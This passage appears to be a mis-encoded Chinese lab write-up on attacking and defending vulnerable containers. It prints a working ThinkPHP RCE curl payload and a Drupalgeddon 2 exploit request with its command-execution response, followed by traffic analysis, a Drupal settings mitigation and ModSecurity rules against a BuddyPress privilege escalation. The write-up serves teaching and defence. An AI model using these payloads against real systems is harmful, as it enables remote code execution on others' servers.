åœ¨ `tcpdump` è¿è¡Œæ—¶ï¼Œé‡æ–°æ‰§è¡Œä¹‹å‰çš„ `curl` æ”»å‡» Payloadï¼Œè·å– Flag çš„ Payloadï¼š

```bash
curl 'http://10.37.133.3:39365/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars%5B0%5D=system&vars%5B1%5D%5B%5D=cat%20/tmp/flag-%7Bbmh8b59ed0c-3042-499e-9a2d-ef93c0e1ec87%7D'
```

  ![1748023040614](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748023040614.png)

3.**åœæ­¢æŠ“åŒ…å¹¶åˆ†æ**:
    æŒ‰ `Ctrl+C` åœæ­¢ `tcpdump`ã€‚ä½¿ç”¨ Wireshark æ‰“å¼€ `thinkphp_traffic.pcap` æ–‡ä»¶ã€‚
    ç­›é€‰ `http` æµé‡ï¼ŒæŸ¥çœ‹åŒ…å«æ¶æ„ Payload çš„ HTTP GET è¯·æ±‚ï¼Œåˆ†æè¯·æ±‚è·¯å¾„ã€å‚æ•°ä»¥åŠæœåŠ¡å™¨çš„å“åº”

  ![1748023079982](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748023079982.png)

  ![1748023099838](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748023099838.png)

åˆ†æ:
    1.  **TCP è¿æ¥å»ºç«‹ (æ•°æ®åŒ… 1-3)**: æ”»å‡»æœº (`10.37.133.3`) ä¸é¶æ ‡å®¹å™¨ (`172.17.0.2`) åœ¨ç«¯å£ `80` ä¸ŠæˆåŠŸå®Œæˆäº† TCP ä¸‰æ¬¡æ¡æ‰‹ã€‚
    2.  **æ¶æ„ HTTP è¯·æ±‚ (æ•°æ®åŒ… 4)**: æ”»å‡»æœºå‘é€äº†ä¸€ä¸ª HTTP GET è¯·æ±‚ï¼Œå…¶ URL åŒ…å«äº†ç”¨äºè§¦å‘ ThinkPHP RCE æ¼æ´å¹¶æ‰§è¡Œ `cat /tmp/flag-{...}` å‘½ä»¤çš„æ¶æ„ Payloadã€‚
    3.  **æœåŠ¡å™¨å“åº”ä¸æ•°æ®å›ä¼  (æ•°æ®åŒ… 6, 8)**: æœåŠ¡å™¨è¿”å› `HTTP/1.1 200 OK` å“åº”ï¼Œè¡¨æ˜è¯·æ±‚è¢«æˆåŠŸå¤„ç†ã€‚å…³é”®çš„å‘½ä»¤æ‰§è¡Œç»“æœ (flag å†…å®¹) åŒ…å«åœ¨æ•°æ®åŒ… 6 (TCP Push) ä¸­å¹¶å›ä¼ ç»™äº†æ”»å‡»æœº
    4.  **TCP è¿æ¥å…³é—­ (æ•°æ®åŒ… 9-10 åŠä¹‹å)**: æ”»å‡»æœºå‘èµ· TCP è¿æ¥çš„å…³é—­æµç¨‹ã€‚

è¿™äº›æ•è·åˆ°çš„æ•°æ®åŒ…æœ‰åŠ›åœ°è¯æ˜äº†æ”»å‡»è€…é€šè¿‡æ„é€ æ¶æ„çš„HTTP GETè¯·æ±‚å°† ls /tmp å‘½ä»¤ä¼ é€’ç»™äº†ç›®æ ‡æœåŠ¡å™¨ï¼Œå¹¶æˆåŠŸæ‰§è¡Œã€‚


# å…¥å£æ¼æ´ç¼“è§£
## æ–¹æ³•ä¸€
### Drupal CVE-2018-7600 æ¼æ´åˆ†æ

### æ¼æ´æ¦‚è¿°

CVE-2018-7600ï¼Œä¹Ÿè¢«ç§°ä¸º"Drupalgeddon 2"ï¼Œæ˜¯Drupalå†…å®¹ç®¡ç†ç³»ç»Ÿä¸­çš„ä¸€ä¸ªä¸¥é‡è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚è¯¥æ¼æ´äº2018å¹´3æœˆ28æ—¥æŠ«éœ²ï¼Œå½±å“Drupal 6ã€7å’Œ8ç‰ˆæœ¬ã€‚

### æ¼æ´ç»†èŠ‚

#### æ¼æ´ç±»å‹
- è¿œç¨‹ä»£ç æ‰§è¡Œ(RCE)
- å½±å“Drupalæ ¸å¿ƒçš„æ¸²æŸ“ç³»ç»Ÿ

#### å—å½±å“ç‰ˆæœ¬
ä½äº 7.58 çš„ Drupalã€ä½äº 8.3.9 çš„ 8.x ç‰ˆæœ¬ã€ä½äº 8.4.6 çš„ 8.4.x ç‰ˆæœ¬ä»¥åŠä½äº 8.5.1 çš„ 8.5.x ç‰ˆæœ¬å…è®¸è¿œç¨‹æ”»å‡»è€…æ‰§è¡Œä»»æ„ä»£ç ï¼Œå› ä¸ºå­˜åœ¨å½±å“å…·æœ‰é»˜è®¤æˆ–é€šç”¨æ¨¡å—é…ç½®çš„å¤šä¸ªå­ç³»ç»Ÿçš„é—®é¢˜ã€‚

#### æ¼æ´æ ¹æº

è¯¥æ¼æ´æºäºDrupalè¡¨å•APIåœ¨å¤„ç†è¡¨å•æ¸²æŸ“æ—¶çš„ç¼ºé™·ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡ç²¾å¿ƒæ„é€ çš„è¯·æ±‚ï¼Œåœ¨è¡¨å•æ¸²æŸ“è¿‡ç¨‹ä¸­æ³¨å…¥æ¶æ„ä»£ç ï¼Œç»•è¿‡ç³»ç»Ÿçš„å®‰å…¨é™åˆ¶ï¼Œæœ€ç»ˆå¯¼è‡´ä»»æ„PHPä»£ç æ‰§è¡Œã€‚

### æ¼æ´åˆ©ç”¨åŸç†

1. **è¡¨å•APIå¤„ç†æµç¨‹**ï¼šDrupalçš„è¡¨å•ç³»ç»Ÿåœ¨å¤„ç†ç”¨æˆ·è¾“å…¥æ—¶ï¼Œä¼šç»å†æ„å»ºã€éªŒè¯ã€æäº¤å’Œæ¸²æŸ“ç­‰é˜¶æ®µã€‚

2. **ä¸å®‰å…¨æ¸²æŸ“**ï¼šåœ¨æ¸²æŸ“é˜¶æ®µï¼Œç³»ç»Ÿä¼šé€’å½’å¤„ç†è¡¨å•å…ƒç´ åŠå…¶å­å…ƒç´ ï¼Œä½†æ²¡æœ‰å……åˆ†è¿‡æ»¤ç”¨æˆ·æä¾›çš„æ•°ç»„é”®åã€‚

3. **æ³¨å…¥ç‚¹**ï¼šæ”»å‡»è€…å¯ä»¥é€šè¿‡æ§åˆ¶è¡¨å•å…ƒç´ çš„`#`å‰ç¼€å±æ€§(å¦‚`#markup`ã€`#access_callback`ç­‰)æ¥æ³¨å…¥æ¶æ„ä»£ç ã€‚

4. **ä»£ç æ‰§è¡Œ**ï¼šé€šè¿‡æ³¨å…¥PHPå‡½æ•°(å¦‚`passthru`ã€`system`ç­‰)ï¼Œæ”»å‡»è€…å¯ä»¥æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

### æ¼æ´åˆ©ç”¨ç¤ºä¾‹

ä¸€ä¸ªå…¸å‹çš„åˆ©ç”¨è¯·æ±‚å¯èƒ½å¦‚ä¸‹æ‰€ç¤ºï¼š

```
POST /user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=passthru&mail[#type]=markup&mail[#markup]=id
```

è¿™ä¸ªè¯·æ±‚ä¼šåˆ©ç”¨Drupalçš„AJAXè¡¨å•å¤„ç†æœºåˆ¶ï¼Œé€šè¿‡`#post_render`å›è°ƒæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚

## æ¼æ´é‡è¦æ€§

CVE-2018-7600è¢«è¯„ä¸º"é«˜å±"æ¼æ´(CVSSè¯„åˆ†9.8)ï¼Œå› ä¸ºï¼š
- æ— éœ€è®¤è¯å³å¯åˆ©ç”¨
- å¯å¯¼è‡´å®Œå…¨ç³»ç»Ÿæ¥ç®¡
- åˆ©ç”¨ä»£ç å…¬å¼€åå¾ˆå¿«å‡ºç°è‡ªåŠ¨åŒ–æ”»å‡»å·¥å…·


## æ¼æ´åˆ©ç”¨

å¯¹å…¥å£é¶æ ‡è¿›è¡Œæ”»å‡»ï¼š
å¯åŠ¨å®¹å™¨ vulfocus/drupal-cve_2018_7600 ï¼Œæ‰“å¼€ç½‘é¡µä»¥åè¿›è¡ŒæŠ“åŒ…ï¼Œå‘é€
```
POST /user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax HTTP/1.1
Host: 192.168.56.119:37124
Content-Type: application/x-www-form-urlencoded
Content-Length: 103

form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=id
```
å¾—åˆ°å›å¤ï¼š
```
HTTP/1.1 200 OK
Date: Wed, 21 May 2025 05:26:04 GMT
Server: Apache/2.4.7 (Ubuntu)
X-Powered-By: PHP/5.5.9-1ubuntu4.19
Cache-Control: must-revalidate, no-cache, private
X-UA-Compatible: IE=edge
Content-language: en
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Expires: Sun, 19 Nov 1978 05:00:00 GMT
X-Generator: Drupal 8 (https://www.drupal.org)
X-Drupal-Ajax-Token: 1
Content-Length: 209
Content-Type: application/json

[{"command":"insert","method":"replaceWith","selector":null,"data":"uid=33(www-data) gid=33(www-data) groups=33(www-data)\u003Cspan class=\u0022ajax-new-content\u0022\u003E\u003C\/span\u003E","settings":null}]
```
è¿”å›ç»“æœä¸­åŒ…å«www-dataç”¨æˆ·æƒé™ä¿¡æ¯ï¼Œè¯æ˜å‘½ä»¤æ‰§è¡ŒæˆåŠŸ
![](img/åˆ©ç”¨å¾—åˆ°å›å¤.png)

## æ¼æ´ç¼“è§£

ç¦ç”¨ç”¨æˆ·æ³¨å†Œå’Œå±é™©è·¯ç”±

### ç¼–è¾‘Drupalçš„settings.phpæ–‡ä»¶
```
nano /var/www/html/sites/default/settings.php
```
åœ¨æ–‡ä»¶æœ«å°¾æ·»åŠ ä»¥ä¸‹å†…å®¹ï¼š

```php
// ç¦ç”¨ç”¨æˆ·æ³¨å†Œ
$config['user.settings']['register'] = 'admin_only';
// å…³é—­AJAXè¡¨å•æ¼æ´å…¥å£
$config['system.performance']['fast_404']['exclude_ajax_paths'] = TRUE;
```
ä»¥æ­¤æ¥æ‹¦æˆªæ¶æ„è¯·æ±‚ç‰¹å¾ï¼ˆå¦‚ `element_parents` å‚æ•°ï¼‰ã€‚
![](img/æ·»åŠ config.png)

### é‡å¯WebæœåŠ¡ï¼š

Apache
```
sudo systemctl restart apache2
```
å†æ¬¡å‘é€å‰é¢çš„è¯·æ±‚ï¼Œ
å¾—åˆ°å“åº”ï¼š
```
HTTP/1.1 403 Forbidden
Date: Wed, 21 May 2025 06:17:02 GMT
Server: Apache/2.4.7 (Ubuntu)
X-Powered-By: PHP/5.5.9-1ubuntu4.19
Cache-Control: must-revalidate, no-cache, private
X-UA-Compatible: IE=edge
Content-language: en
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Expires: Sun, 19 Nov 1978 05:00:00 GMT
X-Generator: Drupal 8 (https://www.drupal.org)
Content-Length: 2
Content-Type: application/json

{}
```

![](img/ç¼“è§£ç»“æœ.png)
å¯ä»¥çœ‹åˆ°ï¼Œæ¼æ´å¾—åˆ°äº†ç¼“è§£ã€‚
æ·»åŠ çš„é˜²æŠ¤æªæ–½ï¼ˆ`settings.php` ä¿®æ”¹ + Apache è§„åˆ™ï¼‰å·²æˆåŠŸæ‹¦æˆªæ”»å‡»è¯·æ±‚ï¼ŒDrupal ä¸å†å¤„ç†åŒ…å«æ¶æ„å‚æ•°ï¼ˆå¦‚ `element_parents`ã€`ajax_form`ï¼‰çš„è¯·æ±‚ï¼Œè¿”å›ç©º JSON `{}` å’Œ 403 çŠ¶æ€ç ã€‚
å¹¶ä¸”ç™»å½•ç½‘é¡µå¯ä»¥çœ‹åˆ°ç•Œé¢å‘ç”Ÿäº†å˜åŒ–ï¼š
![](img/åŸå…ˆç•Œé¢.png)
![](img/ç°åœ¨ç•Œé¢.png)



## æ–¹æ³•äºŒï¼šæ‰“é€ Webåº”ç”¨é˜²ç«å¢™ï¼ˆWAFï¼‰æ¥ç¼“è§£ Wordpress æ¼æ´

### å®éªŒç›®æ ‡
æ­å»ºå¹¶é…ç½® ModSecurity Web åº”ç”¨é˜²ç«å¢™ï¼ˆWAFï¼‰ï¼Œä»¥é˜²å¾¡ Wordpress æ¼æ´æ”»å‡»ã€‚é€šè¿‡å®éªŒï¼ŒæŒæ¡ä»¥ä¸‹å†…å®¹ï¼š
1. ModSecurity çš„å®‰è£…ä¸é…ç½®ã€‚
2. OWASP æ ¸å¿ƒè§„åˆ™é›†ï¼ˆCRSï¼‰çš„ä½¿ç”¨ã€‚
3. é’ˆå¯¹ Wordpress æ¼æ´çš„è‡ªå®šä¹‰è§„åˆ™é…ç½®ã€‚
4. é€šè¿‡åå‘ä»£ç†æµ‹è¯• WAF çš„æ‹¦æˆªæ•ˆæœã€‚
5. è§£å†³å®éªŒè¿‡ç¨‹ä¸­é‡åˆ°çš„å¸¸è§é—®é¢˜ã€‚

---

### å®éªŒç¯å¢ƒ
- æ“ä½œç³»ç»Ÿï¼šKali Linux
- å·¥å…·ï¼šApache2ã€ModSecurityã€OWASP CRSã€Dockerã€Wireshark
- æ¼æ´ç¯å¢ƒï¼šWordpress æ¼æ´æµ‹è¯•ç¯å¢ƒï¼ˆè¿è¡Œåœ¨ 23509 ç«¯å£ï¼‰

---

### å®éªŒæµç¨‹

#### 1. å®‰è£…ModSecurity
ModSecurity æ˜¯ä¸€ä¸ªå¼€æºçš„ Web åº”ç”¨é˜²ç«å¢™ï¼ˆWAFï¼‰æ¨¡å—ï¼Œæ”¯æŒ Apacheã€Nginx ç­‰ Web æœåŠ¡å™¨ã€‚å®ƒé€šè¿‡æ£€æµ‹å’Œæ‹¦æˆªæ¶æ„è¯·æ±‚æ¥ä¿æŠ¤ Web åº”ç”¨ç¨‹åºã€‚

##### å®‰è£…Apacheå’ŒModSecurity
```bash
sudo apt update
sudo apt install apache2 libapache2-mod-security2
```
- apache2 æ˜¯ Apache HTTP æœåŠ¡å™¨ã€‚
- libapache2-mod-security2 æ˜¯ ModSecurity çš„ Apache æ¨¡å—ã€‚
![1748183239288](image/readme/1748183239288.png)

##### é…ç½®ModSecurity
1. å¤‡ä»½é»˜è®¤é…ç½®æ–‡ä»¶ï¼š
   ```bash
   sudo cp /etc/modsecurity/modsecurity.conf-recommended /etc/modsecurity/modsecurity.conf
   ```
   ![1748183212133](image/readme/1748183212133.png)
   - é»˜è®¤æƒ…å†µä¸‹ï¼ŒModSecurity æä¾›äº†ä¸€ä¸ªæ¨èçš„é…ç½®æ–‡ä»¶ modsecurity.conf-recommendedã€‚
   - å¤åˆ¶è¯¥æ–‡ä»¶ä¸º modsecurity.confï¼Œä»¥ä¾¿è¿›è¡Œè‡ªå®šä¹‰é…ç½®ã€‚
2. ç¼–è¾‘é…ç½®æ–‡ä»¶ï¼š
   ```bash
   sudo vim /etc/modsecurity/modsecurity.conf
   ```
   å°†`SecRuleEngine`è®¾ç½®ä¸º`On`ï¼š
   ```bash
   SecRuleEngine On
   ```
   SecRuleEngine æ§åˆ¶ ModSecurity çš„è§„åˆ™å¼•æ“çŠ¶æ€,æœ‰ä»¥ä¸‹ä¸‰ç§çŠ¶æ€:
   - Offï¼šå®Œå…¨ç¦ç”¨è§„åˆ™å¼•æ“ã€‚
   - DetectionOnlyï¼šå¯ç”¨è§„åˆ™å¼•æ“ï¼Œä½†ä»…ç”¨äºæ£€æµ‹ï¼Œä¸ä¼šæ‹¦æˆªæ¶æ„è¯·æ±‚ã€‚
   - Onï¼šå¯ç”¨è§„åˆ™å¼•æ“ï¼Œæ£€æµ‹å¹¶æ‹¦æˆªæ¶æ„è¯·æ±‚ã€‚
   ![1748183252358](image/readme/1748183252358.png)

3. é‡å¯Apacheï¼š
   ```bash
   sudo systemctl restart apache2
   ```
   Apache åœ¨å¯åŠ¨æ—¶ä¼šåŠ è½½ ModSecurity æ¨¡å—åŠå…¶é…ç½®æ–‡ä»¶ã€‚
   ![1748183263888](image/readme/1748183263888.png)

#### 3. ä½¿ç”¨OWASPæ ¸å¿ƒè§„åˆ™é›†ï¼ˆCRSï¼‰
OWASP CRSæä¾›äº†ä¸€å¥—è§„åˆ™ï¼Œç”¨äºé˜²å¾¡å¸¸è§Webæ”»å‡»ã€‚

##### ä¸‹è½½OWASP CRS
```bash
sudo apt install modsecurity-crs
```
OWASP CRS æ˜¯ä¸€ç»„é¢„å®šä¹‰çš„è§„åˆ™ï¼Œè¦†ç›–äº†å¤šç§ Web æ”»å‡»ç±»å‹ã€‚
![1748183274617](image/readme/1748183274617.png)

##### é…ç½®OWASP CRS
1. å°†è§„åˆ™é›†é“¾æ¥åˆ°ModSecurityï¼š
   ```bash
   sudo ln -s /usr/share/modsecurity-crs/ /etc/apache2/modsecurity-crs
   ```
    ![1748183286516](image/readme/1748183286516.png)
   - åˆ›å»ºç¬¦å·é“¾æ¥æ˜¯ä¸ºäº†è®© ModSecurity èƒ½å¤Ÿæ–¹ä¾¿åœ°è®¿é—®å’ŒåŠ è½½ OWASP CRS æä¾›çš„è§„åˆ™æ–‡ä»¶ã€‚
2. åœ¨ModSecurityé…ç½®ä¸­åŠ è½½è§„åˆ™é›†ï¼š
   ```bash
   sudo vim /etc/apache2/mods-enabled/security2.conf
   ```
   æ·»åŠ ä»¥ä¸‹å†…å®¹ï¼š
   ```bash
   IncludeOptional /etc/apache2/modsecurity-crs/*.conf
   IncludeOptional /etc/apache2/modsecurity-crs/rules/*.conf
   ```
   è¿™æ ·é…ç½®å,IncludeOptional æŒ‡ä»¤å‘Šè¯‰ Apache åŠ è½½æŒ‡å®šè·¯å¾„ä¸‹çš„æ‰€æœ‰ .conf æ–‡ä»¶ã€‚åŠ è½½ /etc/apache2/modsecurity-crs/ ç›®å½•ä¸‹çš„æ‰€æœ‰ä¸»é…ç½®æ–‡ä»¶ã€‚åŠ è½½è¯¥ç›®å½•ä¸‹ rules/ å­ç›®å½•ä¸­çš„æ‰€æœ‰è§„åˆ™æ–‡ä»¶
   ![1748183294205](image/readme/1748183294205.png)

3. é‡å¯Apacheï¼š
   ```bash
   sudo systemctl restart apache2
   ```
   ModSecurity ä¼šåœ¨æ¯æ¬¡è¯·æ±‚æ—¶åº”ç”¨è¿™äº›è§„åˆ™ï¼Œæ£€æµ‹å¹¶æ‹¦æˆªæ¶æ„æµé‡ã€‚

#### 4. è‡ªå®šä¹‰ Wordpress æ¼æ´è§„åˆ™é…ç½®
ä¸ºäº†é˜²å¾¡ Wordpress æ¼æ´æ”»å‡»ï¼Œæˆ‘ä»¬éœ€è¦æ·»åŠ é’ˆå¯¹å…¶åŸç†çš„è‡ªå®šä¹‰è§„åˆ™ã€‚

##### æ·»åŠ è‡ªå®šä¹‰è§„åˆ™
1. åˆ›å»ºè‡ªå®šä¹‰è§„åˆ™æ–‡ä»¶ï¼š
   ```bash
   sudo vim /etc/apache2/modsecurity-crs/rules/REQUEST-900-Wordpress.conf
   ```

2. æ·»åŠ ä»¥ä¸‹è§„åˆ™ï¼š
   ```
   # æ‹¦æˆªå°è¯•ä¿®æ”¹è§’è‰²çš„è¯·æ±‚
   SecRule REQUEST_URI "@contains /wp-json/buddypress/v1/members/me" \
      "id:1001,\
      phase:2,\
      block,\
      msg:'BuddyPress æƒé™æå‡å°è¯•',\
      chain"
      SecRule REQUEST_METHOD "@streq POST" \
         "chain"
         SecRule REQUEST_BODY "@rx \"roles\"\s*:\s*\"administrator\"" \
               "t:none,t:urlDecode,t:htmlEntityDecode"

   # æ‹¦æˆªå¼‚å¸¸çš„æ¿€æ´»è¯·æ±‚
   SecRule REQUEST_URI "@rx /wp-json/buddypress/v1/signup/activate/[^/]+$" \
      "id:1002,\
      phase:2,\
      block,\
      msg:'å¯ç–‘çš„BuddyPressè´¦æˆ·æ¿€æ´»å°è¯•'"
   ```
   ğŸ”¹**ç¬¬ä¸€æ¡è§„åˆ™ï¼šæ‹¦æˆªå°è¯•ä¿®æ”¹è§’è‰²çš„è¯·æ±‚ï¼ˆæƒé™æå‡ï¼‰**
      | å‚æ•°åç§° | å€¼/è¡¨è¾¾å¼ | è¯´æ˜ |
      |----------|------------|------|
      | `SecRule` | - | å®šä¹‰ä¸€æ¡ ModSecurity è§„åˆ™ |
      | `REQUEST_URI` | `@contains /wp-json/buddypress/v1/members/me` | åŒ¹é…è¯·æ±‚ URI ä¸­æ˜¯å¦åŒ…å«ç‰¹å®šè·¯å¾„ï¼ˆå³ç›®æ ‡æ¥å£ï¼‰ |
      | `id` | `1001` | è§„åˆ™å”¯ä¸€æ ‡è¯†ç¬¦ï¼Œä¾¿äºæ—¥å¿—è¿½è¸ªå’Œç®¡ç† |
      | `phase` | `2` | åœ¨è¯·æ±‚å¤„ç†é˜¶æ®µ 2ï¼ˆè¯·æ±‚å¤´å’Œè¯·æ±‚ä½“å·²è§£æï¼‰æ‰§è¡Œæ­¤è§„åˆ™ |
      | `block` | - | å¦‚æœåŒ¹é…æˆåŠŸï¼Œåˆ™é˜»æ­¢è¯·æ±‚å¹¶è¿”å› 403 Forbidden |
      | `msg` | `'BuddyPress æƒé™æå‡å°è¯•'` | å½“è§„åˆ™è§¦å‘æ—¶è®°å½•çš„æ—¥å¿—ä¿¡æ¯ |
      | `chain` | - | è¡¨ç¤ºè¯¥è§„åˆ™ä¸ä¸‹ä¸€æ¡è§„åˆ™å½¢æˆâ€œé“¾å¼â€åŒ¹é…å…³ç³»ï¼Œå¿…é¡»åŒæ—¶æ»¡è¶³æ‰€æœ‰æ¡ä»¶æ‰ä¼šè§¦å‘åŠ¨ä½œ |

      - ä½œç”¨ï¼š
         1. æ£€æµ‹è¯·æ±‚æ˜¯å¦è®¿é—®äº† `/wp-json/buddypress/v1/members/me` æ¥å£ï¼›
         2. åˆ¤æ–­è¯·æ±‚æ–¹æ³•æ˜¯å¦ä¸º `POST`ï¼›
         3. æ£€æŸ¥è¯·æ±‚ä½“ä¸­æ˜¯å¦åŒ…å« `"roles": "administrator"`ï¼›
         4. å¦‚æœå…¨éƒ¨æ¡ä»¶éƒ½æ»¡è¶³ï¼ŒModSecurity å°†é˜»æ–­è¯·æ±‚ï¼Œå¹¶è®°å½•æ—¥å¿—ã€‚


   ğŸ”¹**ç¬¬äºŒæ¡è§„åˆ™ï¼šæ‹¦æˆªå¼‚å¸¸çš„æ¿€æ´»è¯·æ±‚ï¼ˆæ³¨å†Œç»•è¿‡ï¼‰**

   ```apache
   SecRule REQUEST_URI "@rx /wp-json/buddypress/v1/signup/activate/[^/]+$" \
      "id:1002,\
      phase:2,\
      block,\
      msg:'å¯ç–‘çš„BuddyPressè´¦æˆ·æ¿€æ´»å°è¯•'"
   ```

   | å‚æ•°åç§° | å€¼/è¡¨è¾¾å¼ | è¯´æ˜ |
   |----------|------------|------|
   | `SecRule` | - | å®šä¹‰ä¸€æ¡ ModSecurity è§„åˆ™ |
   | `REQUEST_URI` | `@rx /wp-json/buddypress/v1/signup/activate/[^/]+$` | ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…è¯·æ±‚ URI æ˜¯å¦ç¬¦åˆ `/wp-json/buddypress/v1/signup/activate/<activation_key>` çš„æ ¼å¼ |
   | `id` | `1002` | è§„åˆ™å”¯ä¸€æ ‡è¯†ç¬¦ |
   | `phase` | `2` | åœ¨è¯·æ±‚å¤„ç†é˜¶æ®µ 2 æ‰§è¡Œæ­¤è§„åˆ™ |
   | `block` | - | å¦‚æœåŒ¹é…æˆåŠŸï¼Œåˆ™é˜»æ­¢è¯·æ±‚å¹¶è¿”å› 403 Forbidden |
   | `msg` | `'å¯ç–‘çš„BuddyPressè´¦æˆ·æ¿€æ´»å°è¯•'` | å½“è§„åˆ™è§¦å‘æ—¶è®°å½•çš„æ—¥å¿—ä¿¡æ¯ |

   - ä½œç”¨ï¼š
      1. æ£€æµ‹è¯·æ±‚æ˜¯å¦è®¿é—®äº† BuddyPress çš„æ¿€æ´»æ¥å£ï¼›
      2. åˆ¤æ–­ URL ä¸­æ˜¯å¦åŒ…å«ä¸€ä¸ªéšæœºç”Ÿæˆçš„æ¿€æ´»å¯†é’¥ï¼ˆå¦‚ `v6EeK8XWihRsxXvXAWPMVzSTO2gs7WdF`ï¼‰ï¼›
      3. å¦‚æœåŒ¹é…æˆåŠŸï¼ŒModSecurity å°†é˜»æ–­è¯·æ±‚å¹¶è®°å½•æ—¥å¿—ã€‚

| æ”»å‡»è¡Œä¸º | å¯¹åº”è§„åˆ™ | åŠŸèƒ½ |
|----------|-----------|------|
| ææƒï¼ˆå°†æ™®é€šç”¨æˆ·å˜ä¸ºç®¡ç†å‘˜ï¼‰ | ç¬¬ä¸€æ¡è§„åˆ™ | æ‹¦æˆª `/wp-json/buddypress/v1/members/me` çš„ POST è¯·æ±‚ä¸­åŒ…å« `"roles": "administrator"` çš„æƒ…å†µ |
| æ³¨å†Œç»•è¿‡ï¼ˆç›´æ¥æ¿€æ´»è´¦æˆ·ï¼‰ | ç¬¬äºŒæ¡è§„åˆ™ | æ‹¦æˆª `/wp-json/buddypress/v1/signup/activate/<activation_key>` çš„è¯·æ±‚ |

å¦‚æœæ¡ä»¶æ»¡è¶³ï¼Œ**ModSecurity å°†é˜»æ–­è¯·æ±‚ï¼Œå¹¶è®°å½•æ—¥å¿—ã€‚** è¿™ç§æ–¹å¼å¯ä»¥æœ‰æ•ˆé˜²å¾¡ CVE-2021-21389 æ¼æ´åˆ©ç”¨è¡Œä¸ºã€‚

3. é‡å¯Apacheï¼š
   ```bash
   sudo systemctl restart apache2
   ```

---

#### 5. ç›‘æ§å’Œæ—¥å¿—åˆ†æ
å¯ç”¨ModSecurityçš„æ—¥å¿—åŠŸèƒ½ï¼Œè®°å½•æ‰€æœ‰æ‹¦æˆªçš„è¯·æ±‚ï¼Œä¾¿äºåç»­åˆ†æã€‚

##### é…ç½®æ—¥å¿—

1. ç¼–è¾‘ModSecurityé…ç½®æ–‡ä»¶ï¼š
   ```bash
   sudo vim /etc/modsecurity/modsecurity.conf
   ```

2. ç¡®ä¿æ—¥å¿—è·¯å¾„æ­£ç¡®ï¼š
   ```bash
   SecAuditLog /var/log/apache2/modsec_audit.log
   ```
   - SecAuditLog æŒ‡ä»¤ç”¨äºæŒ‡å®š ModSecurity å®¡è®¡æ—¥å¿—çš„å­˜å‚¨è·¯å¾„ã€‚
   - /var/log/apache2/modsec_audit.log æ˜¯é»˜è®¤çš„æ—¥å¿—æ–‡ä»¶è·¯å¾„ï¼Œè®°å½•æ‰€æœ‰æ‹¦æˆªçš„è¯·æ±‚åŠå…¶è¯¦ç»†ä¿¡æ¯ã€‚
3. é‡å¯Apacheï¼š
   ```bash
   sudo systemctl restart apache2
   ```


#### 6. **é…ç½® Apache2 ç›‘å¬ `81` ç«¯å£**
ç¼–è¾‘ Apache çš„é…ç½®æ–‡ä»¶ï¼š
```bash
sudo vim /etc/apache2/ports.conf
```
å°† `Listen 80` æ”¹ä¸º `Listen 81`ã€‚
![1748236550489](image/readme/1748236550489.png)
ç¼–è¾‘è™šæ‹Ÿä¸»æœºé…ç½®æ–‡ä»¶ï¼š
```bash
sudo vim /etc/apache2/sites-available/000-default.conf
```
å°† `<VirtualHost *:80>` æ”¹ä¸º `<VirtualHost *:81>`ã€‚
![1748236586413](image/readme/1748236586413.png)
é‡å¯ Apacheï¼š
```bash
sudo systemctl restart apache2
```

---

#### 7. **é…ç½®åå‘ä»£ç†**
å¯ç”¨ Apache çš„åå‘ä»£ç†æ¨¡å—ï¼š
```bash
sudo a2enmod proxy
sudo a2enmod proxy_http
```
- a2enmod å‘½ä»¤ç”¨äºå¯ç”¨ Apache æ¨¡å—ã€‚
proxy å’Œ proxy_http æ¨¡å—ç”¨äºå®ç°åå‘ä»£ç†åŠŸèƒ½ã€‚
- ç¼–è¾‘è™šæ‹Ÿä¸»æœºé…ç½®æ–‡ä»¶ï¼š
```bash
sudo vim /etc/apache2/sites-available/000-default.conf
```
åœ¨ `<VirtualHost *:81>` å—ä¸­æ·»åŠ ä»¥ä¸‹å†…å®¹ï¼š
```bash
<VirtualHost *:81>
    ProxyPreserveHost On
    ProxyPass / http://127.0.0.1:23509/
    ProxyPassReverse / http://127.0.0.1:23509/
</VirtualHost>
```
![1748183339649](image/readme/1748183339649.png)

é‡å¯ Apacheï¼š
```bash
sudo systemctl restart apache2
```
- Apache å°†å¼€å§‹ç›‘å¬ 81 ç«¯å£ï¼Œå¹¶å°†æ‰€æœ‰è¯·æ±‚é€šè¿‡åå‘ä»£ç†è½¬å‘åˆ° 23509 ç«¯å£ã€‚


- **ç›®å‰çš„æ‹“æ‰‘å›¾:**
```bash
+-------------------+       +-------------------+       +-------------------+
|      Client       | ----> |     WAF (Apache   | ----> |   Target Server   |
|    (curl è¯·æ±‚)    |       |   + ModSecurity)  |       | (Wordpress æµ‹è¯•ç¯å¢ƒ) |
+-------------------+       +-------------------+       +-------------------+
        |                           |                           |
        | 1. å‘é€è¯·æ±‚åˆ° 81        | 2. iptables é‡å®šå‘åˆ° 23509    | 3. å¤„ç†è¯·æ±‚
        | ------------------------> | ------------------------> |
        |                           |                           |
        |                           | 4. æ‹¦æˆªæ¶æ„è¯·æ±‚             |
        |                           | (è¿”å› 403 Forbidden)       |
        | <------------------------ |                           |
        |                           |                           |
        |                           | 5. è®°å½•æ—¥å¿—                |
        |                           | (modsec_audit.log)         |
```

---

#### 8. **æµ‹è¯• WAF æ˜¯å¦æ‹¦æˆªæ¶æ„è¯·æ±‚**
```bash
